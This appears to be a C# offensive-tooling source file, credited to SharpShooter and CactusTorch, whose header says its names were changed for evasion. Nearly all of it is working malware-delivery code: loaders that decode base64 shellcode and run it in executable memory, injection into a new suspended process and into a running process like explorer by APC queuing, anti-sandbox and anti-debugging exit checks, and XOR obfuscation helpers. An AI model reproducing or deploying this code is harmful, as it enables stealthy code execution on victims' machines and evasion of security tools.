//Much of this code is swiped and re-worked. 
//Code comes from other projects including:
//	SharpShooter
//	https://github.com/pwndizzle/c-sharp-memory-injection
//	CactusTorch
//
// Code has been renamed for evasion not to remove credit
//
using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

[ComVisible(true)]
public class MysteryMachine
{


    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    [Flags]
    public enum AllocationType : uint
    {
        COMMIT = 0x1000,
        RESERVE = 0x2000,
        GO = 0x3000,
        RESET = 0x80000,
        LARGE_PAGES = 0x20000000,
        PHYSICAL = 0x400000,
        TOP_DOWN = 0x100000,
        WRITE_WATCH = 0x200000
    }
    [Flags]
    public enum MemoryProtection : uint
    {
        EXECUTE = 0x10,
        EXECUTE_READ = 0x20,
        EXECUTE_READWRITE = 0x40,
        EXECUTE_WRITECOPY = 0x80,
        NOACCESS = 0x01,
        READONLY = 0x02,
        READWRITE = 0x04,
        WRITECOPY = 0x08,
        GUARD_Modifierflag = 0x100,
        NOCACHE_Modifierflag = 0x200,
        WRITECOMBINE_Modifierflag = 0x400
    }

    [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
    public delegate Int32 ExecuteDelegate();

    public enum FreeType : uint
    {
        MEM_DECOMMIT = 0x4000,
        MEM_RELEASE = 0x8000
    }
    [DllImport("kernel32")]
    private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

    private static UInt32 MEM_COMMIT = 0x1000;

    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I'm not using this #DFIR  ;-)
    private static UInt32 PAGE_READWRITE = 0x04;
    private static UInt32 PAGE_EXECUTE_READ = 0x20;


    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    [Flags]
    public enum ProcessCreationFlags : uint
    {
        ZERO_FLAG = 0x00000000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NEW_CONSOLE = 0x00000010,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_NO_WINDOW = 0x08000000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_SEPARATE_WOW_VDM = 0x00001000,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_SUSPENDED = 0x00000004,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        DEBUG_PROCESS = 0x00000001,
        DETACHED_PROCESS = 0x00000008,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        INHERIT_PARENT_AFFINITY = 0x00010000
    }
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [Flags]
    public enum ThreadAccess : int
    {
        TERMINATE = (0x0001),
        SUSPEND_RESUME = (0x0002),
        GET_CONTEXT = (0x0008),
        SET_CONTEXT = (0x0010),
        SET_INFORMATION = (0x0020),
        QUERY_INFORMATION = (0x0040),
        SET_THREAD_TOKEN = (0x0080),
        IMPERSONATE = (0x0100),
        DIRECT_IMPERSONATION = (0x0200),
        THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
        THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION

    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
        int dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
         Int32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
    Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
     ProcessAccessFlags processAccess,
     bool bInheritHandle,
     int processId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);


    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    public static extern uint SuspendThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
    int dwSize, uint flNewProtect, out uint lpflOldProtect);

    public MysteryMachine()
    {
    }

    public void velma(int check, string arg)
    {
        CheckPlease cp = new CheckPlease();
        switch (check)
        {
            case 0:
                if (!cp.isDomain(arg)) Environment.Exit(1);
                break;
            case 1:
                if (!cp.isDomainJoined()) Environment.Exit(1);
                break;
            case 2:
                if (cp.containsSandboxArtifacts()) Environment.Exit(1);
                break;
            case 3:
                if (cp.isBadMac()) Environment.Exit(1);
                break;
            case 4:
                if (cp.isDebugged()) Environment.Exit(1);
                break;

        }
    }

    public void daphne(String shellcode64)
    {
        byte[] sc = Convert.FromBase64String(shellcode64);

        IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);

        try
        {
            Marshal.Copy(sc, 0, baseAddr, sc.Length);
            ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));

            del();
        }
        finally
        {
            VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
        }
    }


    public string xb(string key, string input)
    {
        byte[] sc = Convert.FromBase64String(input);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < sc.Length; i++)
            sb.Append((char)(sc[i] ^ key[(i % key.Length)]));
        return Convert.ToBase64String(Encoding.ASCII.GetBytes(sb.ToString()));

    }
    public string x(string key, string input)
    {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < input.Length; i++)
            sb.Append((char)(input[i] ^ key[(i % key.Length)]));
        return sb.ToString();


    }
    public ArrayList r(int length, int count)
    {
        Random random = new Random();
        ArrayList a = new ArrayList();
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        for (int j = 0; j < count; j++)
        {
            char[] stringChars = new char[length];
            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
            a.Add(new String(stringChars));
        }
        return a;
    }

    public ArrayList s(string toSplit, int chunkSize)
    {
        return new ArrayList(ChunkSplit(toSplit, chunkSize));

    }

    public object[] ChunkSplit(string toSplit, int chunkSize)
    {
        int stringLength = toSplit.Length;

        int chunksRequired = (int)Math.Ceiling((decimal)stringLength / (decimal)chunkSize);
        string[] stringArray = new string[chunksRequired];

        int lengthRemaining = stringLength;

        for (int i = 0; i < chunksRequired; i++)
        {
            int lengthToUse = Math.Min(lengthRemaining, chunkSize);
            int startIndex = chunkSize * i;
            stringArray[i] = toSplit.Substring(startIndex, lengthToUse);

            lengthRemaining = lengthRemaining - lengthToUse;
        }

        return stringArray;
    }

    public void scooby(string binary, string shellcode32)
    {
        byte[] sc = Convert.FromBase64String(shellcode32);
        string binaryPath;

        if (binary.IndexOf("\\") >= 0)
        {
            binaryPath = binary;
        }
        else
        {

            if (Environment.GetEnvironmentVariable("ProgramW6432").Length > 0)
            {
                binaryPath = Environment.GetEnvironmentVariable("windir") + "\\SysWOW64\\" + binary;
            }
            else
            {
                binaryPath = Environment.GetEnvironmentVariable("windir") + "\\System32\\" + binary;
            }
        }


        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        // Create new process in suspended state to inject into
        bool success = CreateProcess(binaryPath, null,
            IntPtr.Zero, IntPtr.Zero, false,
            ProcessCreationFlags.CREATE_SUSPENDED,
            IntPtr.Zero, null, ref si, out pi);

        // Allocate memory within process and write shellcode
        IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sc.Length, MEM_COMMIT, PAGE_READWRITE);
        IntPtr bytesWritten = IntPtr.Zero;
        bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, sc, sc.Length, out bytesWritten);

        // Open thread
        IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
        uint oldProtect = 0;

        // Modify memory permissions on allocated shellcode
        resultBool = VirtualProtectEx(pi.hProcess, resultPtr, sc.Length, PAGE_EXECUTE_READ, out oldProtect);

        // Assign address of shellcode to the target thread apc queue
        IntPtr ptr = QueueUserAPC(resultPtr, sht, IntPtr.Zero);

        IntPtr ThreadHandle = pi.hThread;
        ResumeThread(ThreadHandle);


    }


    public void scrappy(string process, string shellcode32)
    {
        byte[] shellcode = Convert.FromBase64String(shellcode32);

        // Open process. "explorer" is a good target due to the large number of threads which will enter alertable state
        Process targetProcess = Process.GetProcessesByName(process)[0];
        IntPtr procHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

        // Allocate memory within process and write shellcode
        IntPtr resultPtr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        IntPtr bytesWritten = IntPtr.Zero;
        bool resultBool = WriteProcessMemory(procHandle, resultPtr, shellcode, shellcode.Length, out bytesWritten);

        // Modify memory permissions on shellcode from XRW to XR
        uint oldProtect = 0;
        resultBool = VirtualProtectEx(procHandle, resultPtr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

        // Iterate over threads and queueapc
        foreach (ProcessThread thread in targetProcess.Threads)
        {
            //Get handle to thread
            IntPtr tHandle = OpenThread(ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);

            //Assign APC to thread to execute shellcode
            IntPtr ptr = QueueUserAPC(resultPtr, tHandle, IntPtr.Zero);
        }
    }
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(
        uint lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr param,
        uint dwCreationFlags,
        ref uint lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds);

    public enum StateEnum
    {
        MEM_COMMIT = 0x1000,
        MEM_RESERVE = 0x2000,
        MEM_FREE = 0x10000
    }

    public enum Protection
    {
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,
        uint size, uint flAllocationType, uint flProtect);



    public void fred(string shellcode32)
    {
        byte[] shellcode = Convert.FromBase64String(shellcode32);
        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
                (uint)StateEnum.MEM_COMMIT, (uint)Protection.PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);

        IntPtr hThread = IntPtr.Zero;
        uint threadId = 0;
        IntPtr pinfo = IntPtr.Zero;

        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        // WaitForSingleObject(hThread, 0xFFFFFFFF);
        return;

    }

}


